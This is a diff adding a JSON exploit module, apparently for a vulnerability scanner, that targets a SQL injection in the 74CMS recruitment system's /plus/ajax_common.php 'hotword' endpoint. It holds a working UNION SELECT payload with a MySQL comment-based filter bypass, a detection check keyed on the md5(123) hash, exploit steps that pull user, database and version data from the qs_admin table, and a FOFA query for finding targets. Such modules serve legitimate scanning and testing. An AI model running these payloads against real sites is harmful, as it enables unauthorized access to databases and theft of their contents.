@@ -1,0 +1,84 @@
+{
+  "Name": "74CMS SQLi with Plus ajax common",
+  "Description": "74cms talent system is a set of free and open source professional talent recruitment system developed based on PHP+MYSQL as the core. An SQL injection vulnerability exists in the 74cms backend of Taiyuan Xunyi Technology Co., Ltd., and attackers can use the vulnerability to obtain sensitive information in the database.",
+  "Product": "74CMS",
+  "Homepage": "https://www.74cms.com/",
+  "DisclosureDate": "2014-05-28",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"74CMS\"",
+  "Level": "3",
+  "Impact": "Leaking the source code, database configuration files, etc., caused the website to be extremely insecure.",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "function",
+      "type": "createSelect",
+      "value": "user(),database(),version()",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+      "AND",
+      {
+          "Request": {
+              "method": "GET",
+              "uri": "/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(123),3+from+qs_admin%23--",
+              "header": {},
+              "data": ""
+          },
+          "ResponseTest": {
+              "type": "group",
+              "operation": "AND",
+              "checks": [
+                  {
+                      "type": "item",
+                      "variable": "$code",
+                      "operation": "==",
+                      "value": "200",
+                      "bz": ""
+                  },
+                  {
+                      "type": "item",
+                      "variable": "$body",
+                      "operation": "contains",
+                      "value": "202cb962ac59075b964b07152d234b70",
+                      "bz": ""
+                  }
+              ]
+          }
+      }
+  ],
+  "ExploitSteps": [
+      "AND",
+      {
+          "Request": {
+              "method": "GET",
+              "uri": "/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,{{{function}}},3+from+qs_admin%23--",
+              "header": {},
+              "data": ""
+          },
+          "SetVariable": [
+              "output|lastbody"
+          ]
+      }
+  ],
+  "Tags": ["sqli"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["74CMS"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+  "Disable": false
+}
